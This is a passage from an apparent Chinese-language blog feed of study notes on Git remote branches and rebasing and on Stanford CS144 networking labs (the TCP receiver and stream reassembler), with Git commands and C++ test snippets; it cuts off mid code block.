Git</em> 中把其比喻为书签 bookmark，非常形象）。</p><blockquote><p><strong>Remote-tracking branches are references to the state of remote branches.</strong> They’re local references that you can’t move; Git moves them for you whenever you do any network communication, to make sure they accurately <u>represent the state of the remote repository</u>.</p></blockquote><p>当我们 clone 一个远端仓库时，我们默认会生成<code>main/master</code>分支指向最新的 commit，同时我们本地也会保存一个分支<code>origin/master</code>来表示远端分支的状态。<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/clone_remote.png" alt="clone_remote.png"><br>如果我们在拉下来的分支上提交一些 commits，同时其他人在远端库中提交另外一些 commits，虽然<code>origin/master</code>分支仍指向 clone 时的状态，但实际上和远端分支已经不同了。如果我们使用<code>fetch</code>来使本地与远端同步：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git fetch &lt;remote&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/fetch_state.png" alt="fetch_state.png"></p><blockquote><p>This command looks up which server <code>origin</code> is, fetches any data from it that <strong>you don’t yet have</strong>, and updates your local database, moving your <code>origin/master</code> pointer to its new, more up-to-date position.</p><p>It’s important to note that when you do a fetch that brings down new remote-tracking branches, <strong>you don’t automatically have local, editable copies of them.</strong></p></blockquote><p>虽然远端分支无法修改，但是可以<code>merge</code>到我们需要的分支中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">merge into your current branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge &lt;remote&gt;/&lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">create a new branch and base it off your remote-tracking branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -b &lt;newBranch&gt; &lt;remote&gt;/&lt;branch&gt;</span></span><br></pre></td></tr></table></figure><h3 id="pushing"><a class="markdownIt-Anchor" href="#pushing"></a> Pushing</h3><p>git 不会自动地将本地的分支和远端的分支进行同步，所以说我们需要自己通过<code>push</code>来实现。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push &lt;remote&gt; &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push &lt;remote&gt; &lt;localBranch&gt;:&lt;remoteBranch&gt;</span></span><br></pre></td></tr></table></figure><p>第一个操作将本地分支推到远端并且将其命名为和本地分支一样的名字，而第二个分支则允许推到远端时将分支命名为别的名字，因为即使两个分支是相互追踪的状态，也是可以具有不同名字的。</p><h3 id="tracking-branches"><a class="markdownIt-Anchor" href="#tracking-branches"></a> Tracking Branches</h3><blockquote><p>Checking out a local branch from a remote-tracking branch automatically creates what is called a <strong>“tracking branch”</strong> (and the branch it tracks is called an <strong>“upstream branch”</strong>).</p></blockquote><p>对于 tracking branch 我们进行<code>git pull</code>操作，相当于是<code>fetch</code>+<code>merge</code>的一种简写 (shorthand)，因为 git 知道从哪个远端仓库拉取数据，并且将分支 merge 到哪个本地分支里！</p><p>我们可以创建一个本地分支来追踪 (track) 远端仓库的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">create a tracking-branch and push to synchronize</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b &lt;newBranch&gt; &lt;remote&gt;/&lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push &lt;remote&gt; &lt;newBranch&gt;</span></span><br></pre></td></tr></table></figure><p>当然，也可以让一个已有的本地分支追踪远端分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">option: <span class="string">&#x27;-u&#x27;</span> or <span class="string">&#x27;--set-upstream-to&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -u &lt;remote&gt;/&lt;branch&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：上面两个操作的前提都是通过<code>fetch</code>已经将远端的分支记录在本地，作为不可修改的远端分支（如上面图例中的<code>origin/master</code>）。这也是可以理解的，如果我只能观察本地的仓库，那我怎么会知道远端仓库有一个新的分支呢！当然如果这个远端仓库的分支我们已经有了记录，也是不需要<code>fetch</code>的。总之我们的操作对象一定是要本地有记录的。<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/tracking.png" alt="tracking.png"></p><blockquote><p>It’s important to note that these numbers (ahead, behind, commit…) are only since the last time you fetched from each server!</p></blockquote><h3 id="pulling"><a class="markdownIt-Anchor" href="#pulling"></a> Pulling</h3><p>再次回顾下一下，<code>fetch</code>操作仅仅将远端的数据下载到本地，并不会对当前的工作目录进行修改，所以需要我们自己手动<code>merge</code>。但如果我们的分支是 tracking branch，那就不需要这么麻烦了，直接<code>git pull</code> 就能合<code>fetch</code>、<code>merge</code>为一。虽然操作方便 (short hand)，但实践中还是可能遇到 merge conflict 等其他问题，所以最好还是一步步来进行。<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/pulling.png" alt="pulling.png"></p><h2 id="rebasing"><a class="markdownIt-Anchor" href="#rebasing"></a> Rebasing</h2><p>除了<code>merge</code>以外，还有一种操作可以合并分支：<code>rebase</code>。考虑和 merge 一样的分支情况：<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/diverge_rebase.png" alt="diverge_rebase.png"><br>在<code>merge</code>操作中，我们会解决 conflict 得到一个新的 merge commit。而<code>rebase</code>操作则是将<code>experiment</code>分支上的提交重新作用 (replay)一次在<code>master</code>分支上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">checkout to the branch you need to rebase</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rebase the current branch to target branch(the one you rebase onto)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git rebase &lt;tragetBranch&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>With the rebase command, you can take all the changes that were committed on one branch and <strong>replay them on a different branch</strong>.</p></blockquote><p>官方文档对<code>rebase</code>操作的讲解是这样的：</p><blockquote><p>This operation works by going to the common ancestor of the two branches (the one you’re on and the one you’re rebasing onto), <u>getting the diff introduced by each commit of the branch you’re on</u>, saving those diffs to temporary files, resetting the current branch to the same commit as the branch you are rebasing onto, and <u>finally applying each change in turn.</u></p></blockquote><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rebase.png" alt="rebase.png"><br>首先将所处分支上所有非共有 commits 的修改保存在一个暂时的文件里，然后将该分支的指针指到需要 “rebase onto” 的那个分支，再将刚刚保存的修改按顺序作用在分支上。这么读起来，好像<code>rebase</code>没有<code>merge</code>那么清晰地讲解如何处理两个分支间的冲突的。直觉能想到的问题是：<strong>如果我在两个分支上对同一文件进行了修改，那么在&quot;replay&quot;后会实现怎么样的取舍？</strong></p><blockquote><p>Now, the snapshot pointed to by <code>C4'</code> is exactly the same as the one that was pointed to by <code>C5</code>in the merge example. There is no difference in the end product of the integration, …</p></blockquote><p><em>Pro Git</em> 说<code>rebase</code>的结果是和<code>merge</code>操作相同的，并没有解答问题。所以我们直接动手来制造 conflict 来看看<code>rebase</code>会发生什么：<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rebase_conflict.png" alt="rebase_conflict.png"><br>原来无论是<code>merge</code>还是<code>rebase</code>都是会发生冲突的！此时<code>git status</code>查看一下：<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rebase_status.png" alt="rebase_status.png"><br>在<code>unmerge paths</code>的 header 下，git 明确地告诉了我们对同一文件的同一地方进行了修改，需要手动改一下文件，<code>add</code>后提交 😄 。所以文中所说的&quot;the same&quot;的意思是说我们通过同样的策略消除冲突，最终得到的 snapshot 和<code>merge</code>操作得到的 snapshot 是一样的。<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/eliminate.png" alt="eliminate.png"><br>很高兴，我们解决了<code>rebase</code>的冲突！那么将这个情况延申到本地分支和远端分支呢会发生？一样的问题，一样的操作！我们只需要把例子中的<code>test</code>换做某个远端分支（例如<code>origin/main</code>），我们可以使用<code>fetch</code>+<code>merge</code>的 combo，这就相当于本地分支的<code>merge</code>了，或者直接<code>git pull --rebase</code>将远端分支放到当前分支后面，相当于本地的<code>rebase</code>。遇到 conflict 问题还是同样要解决的！<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rebase_remote.png" alt="rebase_remote.png"><br><code>rebase</code>和<code>merge</code>相比，它能使得我们的历史看起来更加线性干净。一些人认为<code>merge</code>更好，因为它能保存整个 commit 历史，能从中知道每一次<code>commit</code>、<code>merge</code>的过程和结果，将历史视为&quot;<strong>record of what actually happened</strong>&quot;；另一些人则认为<code>rebase</code>更加号，它阐述的是整个项目的过程是如何一点点构建的，就像我们不会把一个初稿直接提交一样，so why show your messy work? 他们将历史视为&quot;<strong>story of how your project was made</strong>&quot;。那么，你偏好哪一种呢？</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>这篇博文只是总结解释了 Git 的一些基础概念和操作，而没有总结 Git 具体的实现，如 protocol、internals 等。当然啦我也没看就是了，如果感兴趣的话可以直接在<a href="https://git-scm.com/book/en/v2">git 官网</a>读 <em>Pro Git</em>，个人感觉讲的非常之好，边动手边学习，读下来真的受益匪浅。由于我是读的英文版而且还整理博客笔记，算起来花了有 20h+（主要是英语太菜了），不过在这些学习时间里我都感觉非常充实！所以，我能算得上<strong>听说过</strong> Git 了吗？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;上半年搭建完博客后初步了解了一下 git 的常用指令，第一次了解 git 这个版本控制工具，之后又零零散散地通过不同慕课和视频（&lt;em&gt;&lt;a h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Standford CS144 Lab 2</title>
    <link href="http://example.com/2024/09/15/CS144-Lab2/"/>
    <id>http://example.com/2024/09/15/CS144-Lab2/</id>
    <published>2024-09-15T08:59:30.128Z</published>
    <updated>2024-09-25T08:42:50.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验总览"><a class="markdownIt-Anchor" href="#实验总览"></a> 实验总览</h1><p>官方文档对实验的描述如下：</p><blockquote><p>In Lab 2, you will implement the <code>TCPReceiver</code>, the part of a TCP implementation that handles the incoming byte stream. The <code>TCPReceiver</code> translates between incoming TCP segments (the payloads of datagrams carried over the Internet) and the incoming byte stream.</p><p>The <code>TCPReceiver</code> receives segments from the Internet (via the <code>segment received()</code>method) and turns them into calls to your StreamReassembler, which eventually writes to the incoming ByteStream. Applications read from this ByteStream, just as you did in Lab 0 by reading from the TCPSocket.</p></blockquote><p>在 Lab2 中，我们要完成 TCP 框架中的<code>TCPReceiver</code>组件（其中包括我们已经实现的<code>SreamAssembler</code>和<code>ByteStream</code>模块）。这个组件的功能有三：</p><ol><li>接受数据报分片<code>TCPSegement(the actual datagram payloads)</code>，并且将其数据报中的数据提取出来，输入到我们上个实验实现的<code>StreamAssembler</code>中。</li><li>实现流量控制(<strong>flow control</strong>)，因此我们要不断向<code>TCPSender</code>报告滑动窗口(<strong>sliding window</strong>)大小。</li><li>通过<code>segment</code>的序列号保障数据的可靠传输。</li></ol><h1 id="第一部分64-bits-与-32-bits-序列号间转换"><a class="markdownIt-Anchor" href="#第一部分64-bits-与-32-bits-序列号间转换"></a> 第一部分：64-bits 与 32-bits 序列号间转换</h1><h2 id="为什么需要做转换"><a class="markdownIt-Anchor" href="#为什么需要做转换"></a> 为什么需要做转换</h2><ol><li>TCP 报文段的序列号(sequence number)字段的最大长度是 32 字节，而我们的逻辑数据流的每个字节序号(absolute sequence number)的最大长度是 64 字节，所以<code>sequence number</code>在达到最大<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>后会重新从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>开始循环。</li><li>为了安全考虑，在 TCP 连接的三次握手阶段，<code>receiver</code>会随机初始化序号<code>isn</code>(initial sequence number, 32-bits)， 而我们的逻辑流的第一个序号(64-bits)永远是 0。<br>下表来自文档，表示只包含&quot;cat&quot;三个字节的字节流：<img src="/2024/09/15/CS144-Lab2/seqno.png" alt="seqno"></li></ol><h2 id="转换的接口"><a class="markdownIt-Anchor" href="#转换的接口"></a> 转换的接口</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// convert absolute seqno(64-bits) to seqno(32-bits)</span></span><br><span class="line"><span class="function">WrappingInt32 <span class="title">wrap</span><span class="params">(<span class="type">uint64_t</span> n, WrappingInt32 isn)</span></span></span><br><span class="line"><span class="function"><span class="comment">// convert seqno(32-bits) to absolute seqno(64-bits)</span></span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">unwrap</span><span class="params">(WrappingInt32_n, WrappingInt32_isn, <span class="type">uint64_t</span> checkpoint)</span></span></span><br></pre></td></tr></table></figure><p>实现时需要注意的是，<code>SYN</code>和<code>FIN</code>也是占据一个序列号的，虽然它们不是一个报文段也不是表示 payload 数据的字节，仅表示序列号的起始和结尾！具体的实现参考了<a href="https://lrl52.top/998/cs144-lablab2/">CS144 Lab：Lab2 – LRL52 的博客</a>。</p><h1 id="第二部分完善-tcp-receiver-的逻辑"><a class="markdownIt-Anchor" href="#第二部分完善-tcp-receiver-的逻辑"></a> 第二部分：完善 TCP receiver 的逻辑</h1><p><img src="/2024/09/15/CS144-Lab2/evolution.png" alt="evolution"><br>如上图所示，<code>TCP receiver</code>有四种状态：</p><ul><li><code>LISTEN</code>：初始化<code>receiver</code>后还未与<code>sender</code>进行 three-way hand shake，相当与<code>client-server</code>模型中的<code>server</code>处于监听状态，监听来自<code>client</code>的连接请求。此时<code>SYN</code>初始化序列号还未确定，所以无法进行接发包。</li><li><code>SYN_RECV</code>：处于数据交换阶段，还未接受到包含<code>FIN</code>字段的数据包，因此连接持续。</li><li><code>FIN_RECV</code>：接受到<code>FIN</code>的数据包，而且通过重组已经输入到<code>ByteStream</code>中，数据传输已经完成，不再接受数据报。</li><li><code>ERROR</code>： 错误状态。</li></ul><h2 id="测试结果"><a class="markdownIt-Anchor" href="#测试结果"></a> 测试结果</h2><p><img src="/2024/09/15/CS144-Lab2/test.png" alt="test"></p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>实验的第一部分涉及绝对序号 (64-bits)和流序号 (32-bits)之间的转换，需要注意的细节还是很多的。第二部分我花了很多时间精力去看<code>tcp_header</code>和<code>tcp_segment</code>的接口，搞的很迷糊，最后还是没忍住去参考了网上的实现，发现基本上就没有用到。。我觉得还是自己在这方面的理论没有巩固得特别好，所以这个实验从头到尾都做地磕磕绊绊。<br><img src="/2024/09/15/CS144-Lab2/%E6%A1%86%E6%9E%B6.png" alt="框架"><br>回到 TCP 结构图中看这个实验，我们实现了<code>TCPReceiever</code>，它将接受从<code>Sender</code>传来的 TCP 报文段，从中提取负载的报文并输入到之前实现的<code>Reassembler</code>中。为了实现流量控制，我们还计算了当前滑动窗口的大小，但是并没有报告给<code>Sender</code>，这会在下一个实验实现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;实验总览&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#实验总览&quot;&gt;&lt;/a&gt; 实验总览&lt;/h1&gt;
&lt;p&gt;官方文档对实验的描述如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In Lab 2, you will implement the</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Standford CS144 Lab 1</title>
    <link href="http://example.com/2024/08/11/CS144-Lab1/"/>
    <id>http://example.com/2024/08/11/CS144-Lab1/</id>
    <published>2024-08-11T00:47:37.184Z</published>
    <updated>2024-09-14T00:53:46.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lab-1-项目构建"><a class="markdownIt-Anchor" href="#lab-1-项目构建"></a> Lab 1 项目构建</h1><p><img src="/2024/08/11/CS144-Lab1/startcode.png" alt="startcode.png"><br>由于我对<code>git</code>不是很熟练，所以拉取和合并的操作有点麻烦。首先<code>git clone -b lab1-startercode &lt;url&gt;</code>拉取的是别人仓库 lab1 的 start code 到本地，然后<code>git remote rm origin</code>删除与远端仓库的联系，<code>git remote add origin &lt;git@github.com:usrname/reposname.git&gt;</code>和自己的远端仓库联系（<code>&lt;url&gt;</code>的话<code>GitHub</code>已经不支持用户密码登录了，最好是用<code>SSH</code>），再<code>push</code>到远端的一个新的分支上（我的分支名称叫<code>lab1</code>，用来保存<code>starter code</code>）。接着就和文档给出的步骤一样，<code>git fetch</code>同步一下，然后<code>git merge origin/lab1</code>，不出所料会发生<code>merge conflict</code>。<br><img src="/2024/08/11/CS144-Lab1/merge.png" alt="merge.png"><br>不用慌，进到文件夹里一点点 merge 就好。冲突解决完后<code>git add</code> -&gt;<code>git commit</code>-&gt;<code>git push</code>行云流水推到 lab0 的分支上，最后<code>make</code>编译完成了项目初始化。</p><h1 id="实验要求"><a class="markdownIt-Anchor" href="#实验要求"></a> 实验要求</h1><h2 id="总览-lab-01234-框架"><a class="markdownIt-Anchor" href="#总览-lab-01234-框架"></a> 总览 Lab 0/1/2/3/4 框架</h2><p><img src="/2024/08/11/CS144-Lab1/%E6%A1%86%E6%9E%B6.png" alt="框架.png"></p><blockquote><p>Figure: The arrangement of modules and dataflow in your TCP implementation. <strong>The ByteStream was Lab 0.</strong> The job of TCP is to convey two ByteStreams (one in each direction) over an unreliable datagram network, so that bytes written to the socket on one side of the connection emerge as bytes that can be read at the peer, and vice versa. <strong>Lab 1 is the StreamReassembler, and in Labs 2, 3, and 4 you’ll implement the TCPReceiver, TCPSender, and then the TCPConnection to tie it all together.</strong></p></blockquote><p>整个实验将 TCP 模块化分开来完成，最后把几个组件合在一起实现 TCP。在<code>Lab 0</code>的<code>webget</code>函数中，我们直接使用了系统提供的 TCP（<code>&quot;using Linux’s built-in implementation of the Transmission Control Protocol (TCP)&quot;</code>），在此之上我们使用 TCP 提供的服务实现了客户端<code>socket</code>。而接下来我们把视角移动到 socket 面向运输层的一端，将实现自己的 TCP，也就是说我们要<strong>在一个不可靠的网络（网络层）上实现对上层（应用层）提供的服务</strong>。</p><blockquote><p><strong>Over the next four weeks, you’ll implement TCP, to provide the byte-stream abstraction between a pair of computers separated by an unreliable datagram network.</strong></p></blockquote><h2 id="lab-1-要求"><a class="markdownIt-Anchor" href="#lab-1-要求"></a> Lab 1 要求</h2><blockquote><p>In Lab 1, you’ll implement a <strong>stream reassembler</strong>—a module that stitches small pieces of the byte stream (known as substrings, or segments) back into a contiguous stream of bytes in the correct sequence.</p></blockquote><p>在<code>Lab 1</code>中，我们将要完成一个流重组器（stream reassembler），在上面的框架中可以看到它是我们实现<code>TCPReceiver</code>组件的一个子组件，其功能也很清晰：由于网络不可靠，所以数据报可能丢失、失序或者重复（没有考虑出错），流重组器读取这些数据报并将它们转换为可靠的字节流，写入<code>BytesSream</code>中。</p><h1 id="编写代码和调试"><a class="markdownIt-Anchor" href="#编写代码和调试"></a> 编写代码和调试</h1><h2 id="关于实现的思考"><a class="markdownIt-Anchor" href="#关于实现的思考"></a> 关于实现的思考</h2><p>我们要实现的，其实就是在<code>capacity</code>大小的内存限制下，完成子字符串的合并！说起合并，我记起之前在 Leetcode 上做过一道<a href="https://leetcode.cn/problems/SsGoHC/description/">数组合并的问题</a>，还想到了 B 树的合并。</p><p>对于容器的选择（我的 C++不熟练，很多容器都不了解），我看网上有些朋友使用<code>std::vertor</code>，也有选<code>std::set</code>模拟缓冲区的，还有选<code>std::map</code>的。我选择的是<code>std::map</code>，<code>key</code>是<code>size_t</code>类型而<code>value</code>是<code>string</code>类对象，好像运用不到前面无端联想的东西。不得不说<code>map</code>进行合并实在是太繁琐了，要考虑到很多种情况（重复代码也很多），暴力模拟了 200 多行 😭，包含了整整 5 层条件判断 😭。由于太多种情况需要分析了，难免会有疏漏，最后我实在不想修补了，于是便放弃了<code>map</code>。后面我一想，直接每一个序号对应一个字节不久简单很多了吗！！</p><p>看到其他人三四十行就解决了，而我两百行写了一整天，感觉自己真的很菜。当然优化是后话了，至少先把实验完成了，再去考虑减少重复代码（函数封装），提高性能（选择其他数数据结构）等问题。</p><h2 id="流程模拟"><a class="markdownIt-Anchor" href="#流程模拟"></a> 流程模拟</h2><ul><li>输入的子字符串可以由三个量唯一描述：<strong>字符串值、长度、第一个字节的序号</strong>。我们在<code>push_substring</code>中可以看到输入中还有一个量<code>eof</code>，这代表的是<code>substring</code>流是否到达末尾，所以我并没有把它算作子字符串的属性之一。</li><li>我们被限制使用<code>capacity</code>大小的内存，这个内存是由<code>ByteStream</code>中的缓冲区（下图绿色部分）和<code>SreamReassembler</code>自身的缓冲区（下图红色部分）所<strong>共有的</strong>。前者用于缓冲已经重组好但并未被应用程序读取的有序可靠字符串，后者用于缓存接收到的乱序子字符串。<img src="/2024/08/11/CS144-Lab1/capacity.png" alt="capacity.png"></li><li><strong>注意：</strong> 接受到的子字符串可能是乱序、重复的，就如同实际网络中一样。这里的有一些注意点是实验文档里没说清楚的（不足之处），我通过调试测试用例才发现的（面向测试用例编程 😵）。<ul><li>子字符串可能完全位于蓝色/绿色（已读出/已写入<code>ByteStream</code>）部分，需要直接丢掉</li><li>子字符串可能有一部分是已经写入<code>ByteStream</code>（绿色），而有一部分是未写入的（红色），需要进行裁剪</li><li>子字符串可能全是红色部分，实验要求我们在红色部分不能有重叠的字符串，也就是说读入的时候我们要对它进行合并才能缓存到<code>Reassembler</code>中</li><li>字符串可能是包含<code>EOF</code>信息的空字符串，关键在<code>EOF</code>的处理</li></ul></li></ul><h2 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h2><h3 id="std-mapsize_t-std-string版"><a class="markdownIt-Anchor" href="#std-mapsize_t-std-string版"></a> std: :map&lt;size_t, std: :string&gt;版</h3><p>根据以上的思路，我尝试用一个测试用例看看具体的过程，下面是<code>fsm_stream_reassembler_single.cc</code>中的一个例子。</p><blockquote><p>初始化<code>capacity</code>大小为 8，然后输入序号为 0 的&quot;abc&quot;子字符串，直接缓存到<code>ByteStream</code>中，下一个期待接受到的序号应该是 3。之后再输入序号为 6 的&quot;ghX&quot;字符串，且最后一个字节是字符串流的末尾，由于前面还有字节未接收到，因此先缓存到<code>Reassembler</code>的缓冲区中。之后又输入了序号为 2 的字符串&quot;cdefg&quot;，由于序号 2 的字节已经写入<code>ByteSream</code>了，所以我们会对字符串进行裁剪，相当于输入的是序号为 3 的字符串&quot;defg&quot;。注意到此时缓冲区中有已重组的字符串&quot;abc&quot;+未重组的字符串&quot;ghX&quot;，剩余内存大小为 2，也就是说我们只能缓存序号为 3 的&quot;de&quot;字符串，恰好是期望的下一个字节序号，立即写入到<code>ByteStream</code>中。此时<code>ByteStream</code>缓冲区应该有字符串&quot;abcde&quot;，而<code>Reassembler</code>缓存区中应该有序号为 6 的子字符&quot;ghX&quot;，结果与测试用例不符合！</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">ReassemblerTestHarness test&#123;<span class="number">8</span>&#125;;</span><br><span class="line">           </span><br><span class="line">    test.<span class="built_in">execute</span>(SubmitSegment&#123;<span class="string">&quot;abc&quot;</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    test.<span class="built_in">execute</span>(<span class="built_in">BytesAssembled</span>(<span class="number">3</span>));</span><br><span class="line">    test.<span class="built_in">execute</span>(NotAtEof&#123;&#125;);</span><br><span class="line"></span><br><span class="line">    test.<span class="built_in">execute</span>(SubmitSegment&#123;<span class="string">&quot;ghX&quot;</span>, <span class="number">6</span>&#125;.<span class="built_in">with_eof</span>(<span class="literal">true</span>));</span><br><span class="line">    test.<span class="built_in">execute</span>(<span class="built_in">BytesAssembled</span>(<span class="number">3</span>));</span><br><span class="line">    test.<span class="built_in">execute</span>(NotAtEof&#123;&#125;);</span><br><span class="line">           </span><br><span class="line">    test.<span class="built_in">execute</span>(SubmitSegment&#123;<span class="string">&quot;cdefg&quot;</span>, <span class="number">2</span>&#125;);</span><br><span class="line">    test.<span class="built_in">execute</span>(<span class="built_in">BytesAssembled</span>(<span class="number">8</span>));</span><br><span class="line">    test.<span class="built_in">execute</span>(BytesAvailable&#123;<span class="string">&quot;abcdefgh&quot;</span>&#125;);</span><br><span class="line">    test.<span class="built_in">execute</span>(NotAtEof&#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从测试用例来看，是先合并了&quot;defg&quot;和&quot;ghX&quot;，此时缓存区有序号为 3 的字符串&quot;defghX&quot;，而在写入<code>ByteStream</code>时由于内存限制丢弃了最后一个字节！文档中写道 &quot;Receive a substring and write any newly contiguous bytes into the stream. The StreamReassembler will stay within the memory limits of the <code>capacity</code>. Bytes that would exceed the capacity are silently discarded.&quot;是说超过 capacity 大小的字节会丢弃，所以我认为应该是在输入字符串时就把它丢弃的（错误）。</p><p>其实这种想法和具体实践中的网络包收发是相违背的。在处理网络包失序时，如果缓冲区空间有限并且必须丢弃某些数据包，需要考虑的主要原则是<strong>尽量保持数据的有序性并减少重复的传输请求</strong>，所以会优先丢弃序号较大的已缓存的数据，这种策略的主要思想是<strong>保持数据流的连续性</strong>，优先确保期望的下一个序号的数据包能够尽快被接收到。<br><img src="/2024/08/11/CS144-Lab1/%E9%9D%A2%E5%90%91%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B.png" alt="面向测试用例.png"><br>在后续调试过程我发现我还有一些情况没有考虑到，而这种映射关系模拟起来过于繁琐，因此放弃了映射到<code>std::string</code>，尝试映射到<code>std::char</code>重新写一遍。</p><h3 id="std-mapsize_t-char版"><a class="markdownIt-Anchor" href="#std-mapsize_t-char版"></a> std: :map&lt;size_t, char&gt;版</h3><h4 id="实现过程"><a class="markdownIt-Anchor" href="#实现过程"></a> 实现过程</h4><ol><li>先对接收的子字符串进行裁剪，然后缓存到<code>StreamReassembler</code>中</li><li>在<code>capaity</code>缓冲区大小的限制下，采取优先丢弃序号较大的已缓存字符串的策略，对<code>StreamReassembler</code>缓冲区进行限制</li><li>判断是否将<code>StreamReassembler</code>中的重组字符串写入<code>ByteSream</code>中</li></ol><h4 id="测试结果"><a class="markdownIt-Anchor" href="#测试结果"></a> 测试结果</h4><p><img src="/2024/08/11/CS144-Lab1/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png" alt="测试结果.png"><br>测试用例<code>t_strm_reassem_many</code>和<code>t_strm_reassem_win</code>用时过长</p><h2 id="实现代码"><a class="markdownIt-Anchor" href="#实现代码"></a> 实现代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 